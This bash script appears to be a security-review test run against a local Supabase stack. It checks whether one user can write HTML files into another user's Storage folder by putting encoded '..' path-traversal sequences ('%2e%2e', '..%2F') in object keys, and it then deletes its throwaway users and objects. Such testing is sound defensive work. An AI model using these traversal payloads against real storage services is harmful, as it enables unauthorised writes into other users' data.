#!/usr/bin/env bash
# Review 2026-11-09 (server), follow-up: can a member write into ANOTHER caderneta's Storage folder with an encoded
# "..", given that Storage normalises keys after the request (seen with the service key: "a/%2e%2e/x.txt" -> "x.txt")?
# Local stack only: two throwaway users made with the admin API, deleted at the end. Keys read at run time.
set -euo pipefail
eval "$(npx supabase status -o env 2>/dev/null | grep -E '^(API_URL|PUBLISHABLE_KEY|SECRET_KEY)=')"
A="$API_URL"; pw="Rv$(openssl rand -hex 6)"
mk() { curl -s "$A/auth/v1/admin/users" -H "apikey: $SECRET_KEY" -H "Authorization: Bearer $SECRET_KEY" -H 'content-type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"$pw\",\"email_confirm\":true}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])'; }
tok() { curl -s "$A/auth/v1/token?grant_type=password" -H "apikey: $PUBLISHABLE_KEY" -H 'content-type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"$pw\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'; }
ledger() { curl -s "$A/rest/v1/rpc/create_ledger" -H "apikey: $PUBLISHABLE_KEY" -H "Authorization: Bearer $1" -H 'content-type: application/json' -d '{"name":"review"}' | tr -d '"'; }
ua=$(mk attacker-1110@example.invalid); ub=$(mk victim-1110@example.invalid)
ta=$(tok attacker-1110@example.invalid); tb=$(tok victim-1110@example.invalid)
la=$(ledger "$ta"); lb=$(ledger "$tb")
up() { curl -s -o /dev/null -w '%{http_code}' -X POST "$A/storage/v1/object/receipts/$2" -H "apikey: $PUBLISHABLE_KEY" -H "Authorization: Bearer $1" -H 'content-type: text/html' --data-binary 'x'; }
echo "attacker's own folder:             $(up "$ta" "$la/c1/page.html")"
echo "victim's folder, plain:            $(up "$ta" "$lb/c2/page.html")"
echo "victim's folder via %2e%2e:        $(up "$ta" "$la/%2e%2e/$lb/c3/page.html")"
echo "victim's folder via ..%2F:         $(up "$ta" "$la/..%2F$lb/c4/page.html")"
echo "objects now in the victim's folder (service key):"
curl -s "$A/storage/v1/object/list/receipts" -H "apikey: $SECRET_KEY" -H "Authorization: Bearer $SECRET_KEY" -H 'content-type: application/json' \
  -d "{\"prefix\":\"$lb/\"}" | python3 -c 'import sys,json;print("  ", [o["name"] for o in json.load(sys.stdin)])'
echo "objects at the bucket root:"
curl -s "$A/storage/v1/object/list/receipts" -H "apikey: $SECRET_KEY" -H "Authorization: Bearer $SECRET_KEY" -H 'content-type: application/json' \
  -d '{"prefix":""}' | python3 -c 'import sys,json;print("  ", [o["name"] for o in json.load(sys.stdin) if o["name"] in ("'"$la"'","'"$lb"'","c3","c4")])'
# Cleanup: objects under both folders, the ledgers' rows, the users.
for p in "$la/c1/page.html" "$lb/c2/page.html" "$lb/c3/page.html" "$lb/c4/page.html" "c3/page.html"; do
  curl -s -o /dev/null -X DELETE "$A/storage/v1/object/receipts/$p" -H "apikey: $SECRET_KEY" -H "Authorization: Bearer $SECRET_KEY"; done
docker exec -i supabase_db_getnf psql -U postgres -d postgres -qc "delete from public.ledger where id in ('$la','$lb')" >/dev/null 2>&1 || true
for u in $ua $ub; do curl -s -o /dev/null -X DELETE "$A/auth/v1/admin/users/$u" -H "apikey: $SECRET_KEY" -H "Authorization: Bearer $SECRET_KEY"; done
echo "cleaned up"
